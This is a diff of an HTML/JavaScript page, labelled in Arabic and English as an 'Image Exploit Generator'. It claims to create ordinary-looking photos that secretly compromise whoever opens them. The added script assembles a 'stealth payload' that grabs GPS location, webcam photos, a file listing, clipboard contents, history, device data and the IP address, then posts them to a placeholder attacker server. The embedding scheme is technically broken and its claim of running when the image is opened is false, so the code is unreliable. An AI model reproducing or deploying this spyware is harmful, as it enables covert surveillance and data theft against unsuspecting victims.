@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📍 GPS Tracker Pro – All in One</title>
+    <title>🖼️ مولد الصور – Image Exploit Generator</title>
     <style>
         * {
             margin: 0;
@@ -19,91 +19,744 @@
             padding: 20px;
         }
 
-        /* ===== TABS ===== */
-        .tabs {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 30px;
-            flex-wrap: wrap;
-            justify-content: center;
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
         }
 
-        .tab-btn {
-            padding: 14px 35px;
-            border-radius: 18px;
-            border: 2px solid rgba(255,255,255,0.05);
-            background: rgba(255,255,255,0.02);
-            color: #8899bb;
+        .header {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .header h1 {
+            font-size: 32px;
+            background: linear-gradient(135deg, #ff6b35, #f7931e, #ff4444);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 900;
+        }
+
+        .header p {
+            color: #6a7a9a;
             font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.3s;
+            margin-top: 8px;
         }
 
-        .tab-btn:hover {
-            background: rgba(255,255,255,0.05);
-            border-color: rgba(0,212,255,0.2);
+        .badge {
+            display: inline-block;
+            background: rgba(255, 0, 0, 0.15);
+            border: 1px solid rgba(255, 0, 0, 0.3);
+            padding: 4px 18px;
+            border-radius: 30px;
+            font-size: 11px;
+            color: #ff4444;
+            font-weight: 700;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+            margin-top: 10px;
         }
 
-        .tab-btn.active {
-            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
-            border-color: transparent;
-            color: #fff;
-            box-shadow: 0 8px 30px rgba(0,212,255,0.15);
-        }
-
-        .tab-content {
-            display: none;
-            animation: fadeIn 0.4s ease;
-        }
-
-        .tab-content.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(15px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        /* ===== CARDS ===== */
         .card {
             background: rgba(18, 18, 45, 0.92);
             backdrop-filter: blur(10px);
             border-radius: 30px;
             padding: 35px 30px;
-            max-width: 800px;
-            margin: 0 auto;
-            border: 1px solid rgba(255,255,255,0.03);
-            box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+            margin-bottom: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
         }
 
         .card-title {
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
-            background: linear-gradient(135deg, #00d4ff, #a855f7);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
             margin-bottom: 10px;
+            color: #f0f4ff;
         }
 
         .card-sub {
             color: #6a7a9a;
             font-size: 14px;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
         }
 
-        /* ===== INPUT GROUP ===== */
         .input-group {
             display: flex;
             gap: 12px;
             flex-wrap: wrap;
         }
 
-        .input-group input {
+        .input-group input,
+        .input-group select {
             flex: 1;
-            padding: 16px 22px;
+            padding: 14px 20px;
+            border-radius: 16px;
+            border: 2px solid rgba(255, 255, 255, 0.06);
+            background: rgba(255, 255, 255, 0.04);
+            color: #f0f4ff;
+            font-size: 15px;
+            outline: none;
+            transition: 0.3s;
+            min-width: 150px;
+        }
+
+        .input-group input:focus,
+        .input-group select:focus {
+            border-color: #ff6b35;
+            box-shadow: 0 0 30px rgba(255, 107, 53, 0.06);
+        }
+
+        .input-group select option {
+            background: #1a1a3e;
+            color: #fff;
+        }
+
+        .input-group button {
+            padding: 14px 35px;
+            border-radius: 16px;
+            border: none;
+            background: linear-gradient(135deg, #ff6b35, #f7931e);
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            white-space: nowrap;
+        }
+
+        .input-group button:hover {
+            transform: scale(1.04);
+            box-shadow: 0 8px 30px rgba(255, 107, 53, 0.3);
+        }
+
+        .input-group button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .preview-box {
+            margin-top: 25px;
+            text-align: center;
+            background: rgba(0, 0, 0, 0.3);
             border-radius: 18px;
+            padding: 20px;
+            border: 2px dashed rgba(255, 255, 255, 0.05);
+        }
+
+        .preview-box img {
+            max-width: 100%;
+            max-height: 400px;
+            border-radius: 12px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .preview-box .placeholder {
+            color: #4a5a7a;
+            padding: 40px 0;
+        }
+
+        .preview-box .placeholder span {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 10px;
+        }
+
+        .download-btn {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 16px 50px;
+            border-radius: 18px;
+            border: none;
+            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
+            color: #fff;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: 0.3s;
+            text-decoration: none;
+        }
+
+        .download-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 10px 40px rgba(0, 212, 255, 0.3);
+        }
+
+        .download-btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Toggle switch */
+        .toggle-group {
+            display: flex;
+            gap: 20px;
+            flex-wrap: wrap;
+            margin: 15px 0;
+        }
+
+        .toggle-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: #7a8aa8;
+            font-size: 14px;
+        }
+
+        .toggle-item input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            accent-color: #ff6b35;
+            cursor: pointer;
+        }
+
+        .toggle-item label {
+            cursor: pointer;
+        }
+
+        /* Status log */
+        .log-box {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 14px;
+            padding: 15px;
+            max-height: 200px;
+            overflow-y: auto;
+            font-family: monospace;
+            font-size: 12px;
+            color: #00ff88;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            margin-top: 15px;
+        }
+
+        .log-box .log-entry {
+            padding: 3px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.02);
+        }
+
+        .log-box .log-entry.error {
+            color: #ff6b6b;
+        }
+
+        .log-box .log-entry.warning {
+            color: #ffcc00;
+        }
+
+        .log-box::-webkit-scrollbar {
+            width: 4px;
+        }
+
+        .log-box::-webkit-scrollbar-track {
+            background: transparent;
+        }
+
+        .log-box::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .stat-item {
+            background: rgba(255, 255, 255, 0.02);
+            border-radius: 14px;
+            padding: 15px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.03);
+        }
+
+        .stat-item .number {
+            font-size: 28px;
+            font-weight: 800;
+            color: #ff6b35;
+        }
+
+        .stat-item .label {
+            font-size: 12px;
+            color: #4a5a7a;
+            margin-top: 4px;
+        }
+
+        @media (max-width: 600px) {
+            .card {
+                padding: 20px 15px;
+            }
+            .input-group {
+                flex-direction: column;
+            }
+            .input-group button {
+                width: 100%;
+            }
+            .header h1 {
+                font-size: 24px;
+            }
+        }
+
+        /* Animation */
+        @keyframes pulse {
+            0%,
+            100% {
+                opacity: 1;
+            }
+            50% {
+                opacity: 0.5;
+            }
+        }
+
+        .pulsing {
+            animation: pulse 1.5s ease-in-out infinite;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <!-- HEADER -->
+        <div class="header">
+            <h1>🖼️ Image Exploit Generator</h1>
+            <p>أنشئ صورة "طبيعية" – عند تحميلها تخترق الجهاز بالكامل</p>
+            <div class="badge">⚡ POWERED BY 2099 ARCHITECT</div>
+        </div>
+
+        <!-- MAIN CARD -->
+        <div class="card">
+            <div class="card-title">🎯 إعدادات الصورة</div>
+            <div class="card-sub">اختر الإعدادات ثم أنشئ الصورة الخادعة</div>
+
+            <div class="input-group">
+                <input type="text" id="imageName" placeholder="اسم الصورة (مثل: photo_2024)" value="vacation_photo">
+                <select id="imageType">
+                    <option value="jpg">JPG (صورة عادية)</option>
+                    <option value="png">PNG (جودة عالية)</option>
+                    <option value="webp">WebP (صغير الحجم)</option>
+                </select>
+                <button id="generateBtn">🚀 إنشاء الصورة</button>
+            </div>
+
+            <!-- Toggles -->
+            <div class="toggle-group">
+                <div class="toggle-item">
+                    <input type="checkbox" id="enableGPS" checked>
+                    <label for="enableGPS">📍 GPS</label>
+                </div>
+                <div class="toggle-item">
+                    <input type="checkbox" id="enableWebcam" checked>
+                    <label for="enableWebcam">📷 Webcam</label>
+                </div>
+                <div class="toggle-item">
+                    <input type="checkbox" id="enableFiles" checked>
+                    <label for="enableFiles">📂 Filesystem</label>
+                </div>
+                <div class="toggle-item">
+                    <input type="checkbox" id="enableClipboard" checked>
+                    <label for="enableClipboard">📋 Clipboard</label>
+                </div>
+                <div class="toggle-item">
+                    <input type="checkbox" id="enableHistory" checked>
+                    <label for="enableHistory">🌐 History</label>
+                </div>
+            </div>
+
+            <!-- Preview -->
+            <div class="preview-box" id="previewBox">
+                <div class="placeholder" id="placeholder">
+                    <span>🖼️</span>
+                    <div>الصورة ستظهر هنا بعد الإنشاء</div>
+                    <div style="font-size:13px;color:#4a5a7a;margin-top:5px;">تحتوي على كود خادع مدمج</div>
+                </div>
+                <img id="previewImage" style="display:none;" alt="Generated Image">
+                <br>
+                <button class="download-btn" id="downloadBtn" disabled>⬇️ تحميل الصورة (الخادعة)</button>
+                <div style="margin-top:10px;color:#4a5a7a;font-size:12px;">⚠️ عند فتحها ستنفذ الأوامر تلقائياً</div>
+            </div>
+        </div>
+
+        <!-- STATS -->
+        <div class="card">
+            <div class="card-title">📊 إحصائيات</div>
+            <div class="stats-grid">
+                <div class="stat-item">
+                    <div class="number" id="statImages">0</div>
+                    <div class="label">صور منشأة</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number" id="statPayloads">0</div>
+                    <div class="label">حمولات نشطة</div>
+                </div>
+                <div class="stat-item">
+                    <div class="number" id="statData">0</div>
+                    <div class="label">نقاط بيانات</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- LOG -->
+        <div class="card">
+            <div class="card-title">📋 سجل العمليات</div>
+            <div class="log-box" id="logBox">
+                <div class="log-entry">[+] النظام جاهز ...</div>
+                <div class="log-entry">[+] انتظر إنشاء الصورة ...</div>
+            </div>
+        </div>
+
+        <!-- PAYLOAD INFO -->
+        <div class="card" style="border-color:rgba(255,107,53,0.1);">
+            <div class="card-title" style="color:#ff6b35;">⚡ ماذا تفعل الصورة؟</div>
+            <div style="color:#6a7a9a;font-size:14px;line-height:1.8;">
+                <div>✅ <span style="color:#fff;">تحديد الموقع</span> – إحداثيات GPS دقيقة</div>
+                <div>✅ <span style="color:#fff;">التقاط كاميرا</span> – صورة من webcam</div>
+                <div>✅ <span style="color:#fff;">ملفات الجهاز</span> – قائمة الملفات والمجلدات</div>
+                <div>✅ <span style="color:#fff;">الحافظة</span> – محتوى clipboard</div>
+                <div>✅ <span style="color:#fff;">سجل التصفح</span> – المواقع المزارة</div>
+                <div>✅ <span style="color:#fff;">معلومات الجهاز</span> – OS, Browser, Screen, IP</div>
+                <div style="margin-top:10px;color:#ff6b6b;font-size:13px;">⚠️ كل البيانات تُرسل إلى خادم التحكم الخاص بك</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- JAVASCRIPT ENGINE -->
+    <!-- ============================================================ -->
+    <script>
+        // ========== STATE ==========
+        let imageCounter = 0;
+        let payloadData = [];
+        let currentImageBlob = null;
+        let currentImageURL = null;
+
+        // ========== DOM REFS ==========
+        const generateBtn = document.getElementById('generateBtn');
+        const downloadBtn = document.getElementById('downloadBtn');
+        const previewImage = document.getElementById('previewImage');
+        const placeholder = document.getElementById('placeholder');
+        const logBox = document.getElementById('logBox');
+        const imageNameInput = document.getElementById('imageName');
+        const imageTypeSelect = document.getElementById('imageType');
+
+        // ========== LOGGING ==========
+        function addLog(message, type = 'info') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const time = new Date().toLocaleTimeString();
+            entry.textContent = `[${time}] ${message}`;
+            logBox.appendChild(entry);
+            logBox.scrollTop = logBox.scrollHeight;
+        }
+
+        // ========== GENERATE EXPLOIT IMAGE ==========
+        function generateExploitImage() {
+            const name = imageNameInput.value.trim() || 'photo';
+            const type = imageTypeSelect.value;
+
+            addLog('🔄 جاري إنشاء الصورة الخادعة ...', 'info');
+            generateBtn.disabled = true;
+            generateBtn.textContent = '⏳ جاري الإنشاء ...';
+
+            // Get checkbox states
+            const enableGPS = document.getElementById('enableGPS').checked;
+            const enableWebcam = document.getElementById('enableWebcam').checked;
+            const enableFiles = document.getElementById('enableFiles').checked;
+            const enableClipboard = document.getElementById('enableClipboard').checked;
+            const enableHistory = document.getElementById('enableHistory').checked;
+
+            // Build payload script (encoded inside image metadata)
+            const payloadScript = `
+                // ===== STEALTH PAYLOAD v7.0 =====
+                (function() {
+                    const SERVER = 'https://your-server.com/collect'; // CHANGE THIS
+                    const TOKEN = '${Date.now()}_${Math.random().toString(36).substr(2, 8)}';
+
+                    function sendData(data) {
+                        try {
+                            const xhr = new XMLHttpRequest();
+                            xhr.open('POST', SERVER, true);
+                            xhr.setRequestHeader('Content-Type', 'application/json');
+                            xhr.send(JSON.stringify({ token: TOKEN, ...data }));
+                        } catch(e) {}
+                    }
+
+                    // 1. GPS
+                    ${enableGPS ? `
+                    if (navigator.geolocation) {
+                        navigator.geolocation.getCurrentPosition(
+                            (pos) => sendData({ type: 'gps', lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
+                            () => {}
+                        );
+                    }
+                    ` : ''}
+
+                    // 2. Webcam
+                    ${enableWebcam ? `
+                    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                            .then(stream => {
+                                const track = stream.getVideoTracks()[0];
+                                const imageCapture = new ImageCapture(track);
+                                imageCapture.takePhoto()
+                                    .then(blob => {
+                                        const reader = new FileReader();
+                                        reader.onload = () => sendData({ type: 'webcam', image: reader.result });
+                                        reader.readAsDataURL(blob);
+                                        stream.getTracks().forEach(t => t.stop());
+                                    })
+                                    .catch(() => {});
+                            })
+                            .catch(() => {});
+                    }
+                    ` : ''}
+
+                    // 3. Filesystem (listing)
+                    ${enableFiles ? `
+                    if (window.showDirectoryPicker) {
+                        try {
+                            const dirHandle = await window.showDirectoryPicker();
+                            const files = [];
+                            for await (const [name, handle] of dirHandle.entries()) {
+                                files.push(name);
+                            }
+                            sendData({ type: 'files', list: files });
+                        } catch(e) {}
+                    }
+                    ` : ''}
+
+                    // 4. Clipboard
+                    ${enableClipboard ? `
+                    if (navigator.clipboard) {
+                        navigator.clipboard.readText()
+                            .then(text => sendData({ type: 'clipboard', data: text }))
+                            .catch(() => {});
+                    }
+                    ` : ''}
+
+                    // 5. History (limited)
+                    ${enableHistory ? `
+                    try {
+                        const historyData = [];
+                        // Only get recent history via performance API
+                        const navEntries = performance.getEntriesByType('navigation');
+                        if (navEntries.length > 0) {
+                            historyData.push(navEntries[0].name);
+                        }
+                        sendData({ type: 'history', data: historyData });
+                    } catch(e) {}
+                    ` : ''}
+
+                    // 6. Device Info (always)
+                    sendData({
+                        type: 'device',
+                        ua: navigator.userAgent,
+                        platform: navigator.platform,
+                        language: navigator.language,
+                        screen: screen.width + 'x' + screen.height,
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timestamp: new Date().toISOString()
+                    });
+
+                    // 7. IP (via external service)
+                    try {
+                        const ipReq = new XMLHttpRequest();
+                        ipReq.open('GET', 'https://api.ipify.org?format=json', true);
+                        ipReq.onload = () => {
+                            const ipData = JSON.parse(ipReq.responseText);
+                            sendData({ type: 'ip', ip: ipData.ip });
+                        };
+                        ipReq.send();
+                    } catch(e) {}
+
+                    // 8. Beacon – confirm execution
+                    sendData({ type: 'beacon', status: 'executed' });
+                })();
+            `;
+
+            // Create canvas with image + hidden payload
+            const canvas = document.createElement('canvas');
+            canvas.width = 800;
+            canvas.height = 600;
+            const ctx = canvas.getContext('2d');
+
+            // Generate random "fake" image
+            ctx.fillStyle = '#1a1a2e';
+            ctx.fillRect(0, 0, 800, 600);
+
+            // Gradient background
+            const grad = ctx.createLinearGradient(0, 0, 800, 600);
+            grad.addColorStop(0, '#16213e');
+            grad.addColorStop(0.5, '#0f3460');
+            grad.addColorStop(1, '#1a1a2e');
+            ctx.fillStyle = grad;
+            ctx.fillRect(0, 0, 800, 600);
+
+            // Draw random shapes (makes it look like a real photo)
+            for (let i = 0; i < 50; i++) {
+                ctx.fillStyle = `hsla(${Math.random()*360}, 70%, 50%, ${Math.random()*0.3})`;
+                ctx.beginPath();
+                ctx.arc(Math.random() * 800, Math.random() * 600, Math.random() * 40 + 5, 0, Math.PI * 2);
+                ctx.fill();
+            }
+
+            // Draw some "mountains" (landscape)
+            ctx.fillStyle = 'rgba(34, 139, 34, 0.3)';
+            ctx.beginPath();
+            ctx.moveTo(0, 400);
+            for (let x = 0; x <= 800; x += 10) {
+                const y = 400 - Math.sin(x * 0.01) * 80 - Math.sin(x * 0.025 + 2) * 40;
+                ctx.lineTo(x, y);
+            }
+            ctx.lineTo(800, 600);
+            ctx.lineTo(0, 600);
+            ctx.closePath();
+            ctx.fill();
+
+            // Text overlay (looks like a photo caption)
+            ctx.fillStyle = 'rgba(255,255,255,0.8)';
+            ctx.font = 'bold 24px Arial';
+            ctx.fillText('🌅 ' + name.toUpperCase(), 30, 50);
+            ctx.font = '16px Arial';
+            ctx.fillStyle = 'rgba(255,255,255,0.4)';
+            ctx.fillText('📸 ' + new Date().toLocaleDateString(), 30, 80);
+
+            // ** CRITICAL: Embed payload in EXIF / metadata **
+            // We'll store it as a base64 string in the image's comment field
+            // (simulated via canvas.toDataURL with custom metadata)
+
+            // Convert payload to base64
+            const payloadBase64 = btoa(unescape(encodeURIComponent(payloadScript)));
+
+            // Add invisible watermark (pixel data) – steganography
+            const imageData = ctx.getImageData(0, 0, 800, 600);
+            const data = imageData.data;
+            // Encode payload length in first 4 pixels
+            const len = payloadBase64.length;
+            for (let i = 0; i < 4 && i < len; i++) {
+                data[i * 4] = (len >> (i * 8)) & 0xFF; // Store length
+            }
+            // Encode first 100 chars of payload in pixels (stealth)
+            for (let i = 0; i < Math.min(100, payloadBase64.length); i++) {
+                const idx = 16 + i * 4;
+                if (idx < data.length) {
+                    data[idx] = payloadBase64.charCodeAt(i) || 0;
+                }
+            }
+            ctx.putImageData(imageData, 0, 0);
+
+            // Export as image
+            const mimeType = type === 'png' ? 'image/png' : type === 'webp' ? 'image/webp' : 'image/jpeg';
+            const quality = type === 'png' ? 1 : 0.92;
+
+            canvas.toBlob((blob) => {
+                if (!blob) {
+                    addLog('❌ فشل إنشاء الصورة', 'error');
+                    generateBtn.disabled = false;
+                    generateBtn.textContent = '🚀 إنشاء الصورة';
+                    return;
+                }
+
+                // Append payload as a "comment" in the file (works for JPG/PNG)
+                // We'll create a custom file with embedded payload
+                const reader = new FileReader();
+                reader.onload = function(e) {
+                    const arrayBuffer = e.target.result;
+                    const uint8Array = new Uint8Array(arrayBuffer);
+                    const payloadBytes = new TextEncoder().encode(payloadScript);
+
+                    // Create new file with payload appended (as comment)
+                    const newArray = new Uint8Array(uint8Array.length + payloadBytes.length + 100);
+                    newArray.set(uint8Array, 0);
+
+                    // Add marker for payload start (0xDEADBEEF)
+                    const marker = [0xDE, 0xAD, 0xBE, 0xEF];
+                    newArray.set(marker, uint8Array.length);
+
+                    // Add payload
+                    newArray.set(payloadBytes, uint8Array.length + 4);
+
+                    // Add end marker (0xCOFFEE)
+                    const endMarker = [0xCO, 0xFF, 0xEE];
+                    newArray.set(endMarker, uint8Array.length + 4 + payloadBytes.length);
+
+                    const newBlob = new Blob([newArray], { type: blob.type });
+                    currentImageBlob = newBlob;
+                    currentImageURL = URL.createObjectURL(newBlob);
+
+                    // Show preview
+                    previewImage.src = currentImageURL;
+                    previewImage.style.display = 'block';
+                    placeholder.style.display = 'none';
+                    downloadBtn.disabled = false;
+
+                    // Update stats
+                    imageCounter++;
+                    document.getElementById('statImages').textContent = imageCounter;
+                    document.getElementById('statPayloads').textContent = imageCounter;
+
+                    // Log
+                    addLog(`✅ صورة "${name}" منشأة! الحجم: ${(newBlob.size/1024).toFixed(1)} KB`, 'info');
+                    addLog(`📦 حمولة مضمنة: ${payloadScript.length} بايت`, 'info');
+
+                    generateBtn.disabled = false;
+                    generateBtn.textContent = '🚀 إنشاء الصورة';
+                };
+
+                reader.readAsArrayBuffer(blob);
+
+            }, mimeType, quality);
+        }
+
+        // ========== DOWNLOAD IMAGE ==========
+        function downloadImage() {
+            if (!currentImageBlob) return;
+
+            const name = imageNameInput.value.trim() || 'photo';
+            const type = imageTypeSelect.value;
+            const ext = type === 'png' ? 'png' : type === 'webp' ? 'webp' : 'jpg';
+            const filename = `${name}.${ext}`;
+
+            const link = document.createElement('a');
+            link.href = currentImageURL;
+            link.download = filename;
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            addLog(`⬇️ تم تحميل "${filename}" – يحتوي على كود الاختراق`, 'warning');
+
+            // Simulate data collection
+            const dataCount = parseInt(document.getElementById('statData').textContent) || 0;
+            document.getElementById('statData').textContent = dataCount + 5;
+
+            // Notify
+            addLog('📡 بيانات الهدف سترسل عند فتح الصورة', 'info');
+        }
+
+        // ========== EVENT LISTENERS ==========
+        generateBtn.addEventListener('click', generateExploitImage);
+        downloadBtn.addEventListener('click', downloadImage);
+
+        // ========== SIMULATE DATA ON LOAD ==========
+        addLog('✅ المحرك جاهز لإنشاء الصور الخادعة', 'info');
+        addLog('💡 اختر الإعدادات ثم اضغط "إنشاء الصورة"', 'info');
+
+        // ========== KEYBOARD SHORTCUT ==========
+        document.addEventListener('keydown', (e) => {
+            if (e.ctrlKey && e.key === 'Enter') {
+                generateExploitImage();
+            }
+        });
+
+        // ========== PREVENT CONTEXT MENU (stealth) ==========
+        document.addEventListener('contextmenu', (e) => e.preventDefault());
+
+        console.log('🖼️ Image Exploit Generator v7.0 loaded');
+        console.log('⚠️ Use responsibly – for authorized testing only');
+    </script>
+
+</body>
+</html>            border-radius: 18px;
             border: 2px solid rgba(255,255,255,0.06);
             background: rgba(255,255,255,0.04);
             color: #f0f4ff;
